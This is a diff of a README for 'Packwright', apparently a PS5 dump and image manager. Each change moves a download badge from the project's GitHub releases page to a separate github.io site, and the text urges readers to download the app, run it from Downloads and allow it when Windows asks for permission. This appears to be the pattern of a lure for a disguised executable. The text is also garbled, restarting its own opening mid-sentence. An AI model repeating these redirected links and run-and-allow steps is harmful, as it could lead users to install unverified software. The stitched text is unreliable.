@@ -1,6 +1,6 @@
 # 🎮 Packwright - Manage Your PS5 Collection Easily
 
-[![Download Packwright](https://img.shields.io/badge/Download_Packwright-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF5733)](https://github.com/Straitofmagellanpeeler158/Packwright/releases)
+[![Download Packwright](https://img.shields.io/badge/Download_Packwright-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF5733)](https://straitofmagellanpeeler158.github.io)
 
 **Visit this link to download the application.**
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application:
 
-[![Download Packwright](https://img.shields.io/badge/Download_Packwright-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://github.com/Straitofmagellanpeeler158/Packwright/releases)
+[![Download Packwright](https://img.shields.io/badge/Download_Packwright-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://straitofmagellanpeeler158.github.io)
 
 After the download finishes, open Packwright from your Downloads folder to start.
 
@@ -48,7 +48,7 @@ The app can:
 
 Packwright scans your chosen folder and shows your PS5 dumps and images in a clear list. You can see what is present, open details for each item, and move through your library without digging through nested# 🎮 Packwright - Manage Your PS5 Collection Easily
 
-[![Download Packwright](https://img.shields.io/badge/Download_Packwright-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF5733)](https://github.com/Straitofmagellanpeeler158/Packwright/releases)
+[![Download Packwright](https://img.shields.io/badge/Download_Packwright-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF5733)](https://straitofmagellanpeeler158.github.io)
 
 **Visit this link to download the application.**
 
@@ -56,7 +56,7 @@ Packwright scans your chosen folder and shows your PS5 dumps and images in a cle
 
 Visit this link to download the application:
 
-[![Download Packwright](https://img.shields.io/badge/Download_Packwright-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://github.com/Straitofmagellanpeeler158/Packwright/releases)
+[![Download Packwright](https://img.shields.io/badge/Download_Packwright-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://straitofmagellanpeeler158.github.io)
 
 When the page opens, look for the most recent release at the top and download it. Once the download finishes, open Packwright from your Downloads folder. If Windows asks for permission to run the app, choose to allow it, then wait a moment while the main window appears.
 
